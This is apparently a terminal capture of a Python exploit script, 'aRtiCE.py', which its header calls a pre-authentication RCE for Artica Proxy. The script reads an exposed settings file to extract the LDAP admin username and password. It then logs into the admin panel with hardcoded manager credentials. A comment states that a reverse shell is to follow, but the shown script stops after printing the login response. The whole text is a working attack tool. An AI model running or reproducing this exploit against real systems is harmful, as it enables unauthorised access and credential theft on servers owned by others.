c@kali:~/src$ cat aRtiCE.py
#!/usr/bin/env python
# aRtiCE.py - preauth RCE in Artica Proxy
#
# 29.01.2019
#

import urllib3 # to disable ssl warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import sys, requests
import re

target = sys.argv[1]

print '[+] checking target: %s' % ( target )

sess = requests.session()
sess_link = target + ':9000/'
init_req = sess.get(sess_link, verify=False)
init_resp = init_req.text

# print init_resp
print '[+] init request - ok...'
print '[+] trying settings file...'

sett_link = target + ':9000/ressources/settings.inc'
sett_req = sess.get(sett_link, verify=False)
sett_resp = sett_req.text

if sett_resp:
  find_login = re.compile('GLOBAL\["ldap_admin"\]="(.*?)";')
  login = re.search(find_login, sett_resp)
  if login:
    print '[+] got login: %s' % ( login.group(1) )


  find_pwd = re.compile('GLOBAL\["ldap_password"\]=\'(.*?)\';')
  pwd = re.search(find_pwd, sett_resp)

  if pwd:
    print '[+] got password: %s' % ( pwd.group(1) )

  # got valid credentials, go to admin panel and run revshell
  # login admin:
  login_data = {
    'artica_username':'Manager',
    'artica_password':'5ebe2294ecd0e0f08eab7690d2a6ee69',
    'artica_password_crypted':'0x8fe2891cbbc256a0'
  }
  login_link = target + ':9000/logon.php'
  login_req = sess.post(login_link, data=login_data,verify=False)
  login_resp = login_req.text

  print login_resp



